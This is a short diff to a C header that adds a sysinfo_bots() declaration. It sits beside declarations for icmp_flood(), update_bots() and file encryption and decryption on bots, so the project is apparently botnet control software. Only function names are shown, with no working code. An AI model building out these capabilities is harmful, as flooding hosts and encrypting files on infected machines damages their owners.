@@ -17,5 +17,6 @@ void update_bots();
 void icmp_flood();
 void encrypt_file_on_bot();
 void decrypt_file_on_bot();
+void sysinfo_bots();
 
 #endif
